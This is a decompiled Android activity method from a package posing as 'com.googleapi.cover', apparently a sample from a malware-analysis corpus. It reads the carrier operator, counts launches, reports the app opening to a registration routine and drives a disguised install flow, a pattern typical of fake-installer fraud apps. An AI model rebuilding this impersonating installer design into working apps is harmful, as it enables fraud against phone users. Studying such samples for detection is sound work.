Package Path:com.googleapi.cover.Main.onCreate
Class Name:Main
Content: package com.googleapi.cover;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(1);
        getWindow().addFlags(1024);
        this.actor = new Actor(this, TextUtils.getOperatorString(this));
        if (getSharedPreferences(KEY_PREFS, 0).getInt(TextUtils.getDailyKey(), 0) > 2) {
            showLastScreen(new Intent(this, (Class<?>) ShowURL.class));
        }
        if (Settings.System.getInt(getContentResolver(), "airplane_mode_on", 0) != 0) {
            showAirplaneDialog();
            return;
        }
        setContentView(R.layout.main);
        DevReg.sendOpening(this);
        this.progressBar = (ProgressBar) findViewById(R.id.p_bar);
        this.pleaseWaitString = getResources().getString(R.string.please_wait);
        if (!this.actor.wasActError()) {
            initSettings();
            if (this.progressBar.getVisibility() == 0) {
                initializeGUI();
                install();
                return;
            } else {
                if (this.progressBar.getVisibility() != 0) {
                    if (!isLoadedLinkActivated()) {
                        finishInstallation(null);
                    }
                    updateGUI();
                    return;
                }
                return;
            }
        }
        finish();
    }

